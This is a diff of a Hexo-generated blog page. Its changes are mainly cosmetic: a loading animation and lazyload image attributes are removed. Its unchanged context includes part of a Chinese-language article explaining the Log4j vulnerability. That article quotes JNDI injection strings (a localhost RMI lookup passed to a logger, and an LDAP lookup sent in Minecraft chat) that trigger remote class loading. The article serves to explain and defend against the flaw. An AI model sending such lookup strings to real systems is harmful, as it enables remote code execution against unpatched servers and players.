@@ -97,30 +97,6 @@
     <!-- 预加载动画 -->
     <!-- 页面预加载动画 -->
 
-<div id='loader'>
-  <link rel="stylesheet" href="/js/loaded/index.css" >
-  <div class="loading-left-bg"></div>
-  <div class="loading-right-bg"></div>
-  <div class="spinner-box">
-    <div class="configure-border-1">
-      <div class="configure-core"></div>
-    </div>
-    <div class="configure-border-2">
-      <div class="configure-core"></div>
-    </div>
-    <div class="loading-word">loading...</div>
-  </div>
-</div>
-
-<script>
-  var endLoading = function () {
-    document.body.style.overflow = 'auto';
-    document.getElementById('loader').classList.add("loading");
-  }
-  window.addEventListener('DOMContentLoaded',endLoading);
-  
-</script>
-
     
     <!-- 判断是否为暗黑风格 -->
     <!-- 判断是否为黑夜模式 -->
@@ -225,7 +201,7 @@
   </transition>
   <div class="drawer-box" :class="{'active': visible}">
     <div class="drawer-box-head bg-color">
-      <img class="drawer-box-head_logo lazyload placeholder" src="http://106.12.125.218/medias/pre-medias/logo.png" class="lazyload placeholder" data-srcset="http://106.12.125.218/medias/pre-medias/logo.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+      <img class="drawer-box-head_logo" src="http://106.12.125.218/medias/pre-medias/logo.png" alt="logo">
       <h3 class="drawer-box-head_title">snowgo</h3>
       <h5 class="drawer-box-head_desc"></h5>
     </div>
@@ -409,7 +385,7 @@
     <div class="blog-title" id="author-avatar">
       
         <div class="avatar">
-          <img src="http://106.12.125.218/medias/pre-medias/logo.png" class="lazyload placeholder" data-srcset="http://106.12.125.218/medias/pre-medias/logo.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+          <img src="http://106.12.125.218/medias/pre-medias/logo.png" alt="logo">
         </div>
       
       <a href="/" class="logo">snowgo</a>
@@ -733,7 +709,7 @@
 <p>    以上是黑客服务器上运行的代码。所以只需要你电脑上某个 Java 程序运行以下代码:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String log = <span class="string">&quot;$&#123;jndi:rmi//127.0.0.1:1099/heike&#125;&quot;</span>;</span><br><span class="line">logger.info(log);</span><br></pre></td></tr></table></figure>
 <p>    此处的 “log” 可以是玩家说的话，昵称等，不需要程序特定这么写。<br>​</p>
-<p>    就会出现如下状况:<br><img src="http://106.12.125.218/medias/medias/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/0.png" class="lazyload placeholder" data-srcset="http://106.12.125.218/medias/medias/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/0.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"><br>被黑客入侵 (执行了 Heike.class)<br>​</p>
+<p>    就会出现如下状况:<br><img src="http://106.12.125.218/medias/medias/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/0.png"><br>被黑客入侵 (执行了 Heike.class)<br>​</p>
 <p>    这仅仅是打开了一个信息框，但实际上黑客可以往 Heike.class 放任何代码，在不经意间使你的电脑报废或所有账号全被偷走。</p>
 <h3 id="我的世界JAVA版攻击"><a href="#我的世界JAVA版攻击" class="headerlink" title="我的世界JAVA版攻击"></a>我的世界JAVA版攻击</h3><p>特别是我的世界JAVA版本中，攻击方法超级简单，在游戏的在线聊天中，发送一条带漏洞触发指令的消息，类似<br>“${jndi:ldap://{}.<a target="_blank" rel="noopener" href="http://xxxxxxxxxxxxxx}”,就可以对收到这条消息的用户发起攻击./">http://xxxxxxxxxxxxxx}”,就可以对收到这条消息的用户发起攻击。</a></p>
 <h2 id="如何解决？"><a href="#如何解决？" class="headerlink" title="如何解决？"></a>如何解决？</h2><p>​</p>
@@ -795,7 +771,7 @@
   <div class="post-nav-prev post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://images2.alphacoders.com/176/thumb-1920-176292.jpg" class="lazyload placeholder" data-srcset="https://images2.alphacoders.com/176/thumb-1920-176292.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+      <img class="lazyload" src="https://images2.alphacoders.com/176/thumb-1920-176292.jpg" alt="">
     </div>
     <a href="/2022/01/22/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93V5.0/" class="post-nav-link">
       <div class="title">
@@ -818,7 +794,7 @@
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://images7.alphacoders.com/118/thumb-1920-1189235.png" class="lazyload placeholder" data-srcset="https://images7.alphacoders.com/118/thumb-1920-1189235.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+      <img class="lazyload" src="https://images7.alphacoders.com/118/thumb-1920-1189235.png" src="" alt="">
     </div>
     <a href="/2021/12/04/%E5%92%8C%E9%B2%B8%E8%AE%AD%E7%BB%83%E8%90%A5-%E5%95%86%E4%B8%9A%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/" class="post-nav-link">
       <div class="title">
@@ -1241,7 +1217,7 @@
       
         
           <div class="footer-copyright">
-            <p>Copyright © 2020 - 2022 <a target="_blank" rel="noopener" href="https://github.com/snowgo">snowgo</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> | <a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referra" style="display: inline-block;  vertical-align: middle;"><img src="https://cdn.jsdelivr.net/gh/xingjiahui/CDN/又拍云_logo.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/xingjiahui/CDN/又拍云_logo.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" align="absmiddle" width="59px" height="30px" /></a></p>
+            <p>Copyright © 2020 - 2022 <a target="_blank" rel="noopener" href="https://github.com/snowgo">snowgo</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> | <a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referra" style="display: inline-block;  vertical-align: middle;"><img src="https://cdn.jsdelivr.net/gh/xingjiahui/CDN/又拍云_logo.png" align="absmiddle" width="59px" height="30px" /></a></p>
 
           </div>
         
@@ -1323,12 +1299,16 @@
 <style>
 .aplayer .aplayer-lrc p {
   
+  display: none;
+  
   font-size: 12px;
   font-weight: 700;
   line-height: 16px !important;
 }
 
 .aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  display: none;
   
   font-size: 15px;
   color: #010202;
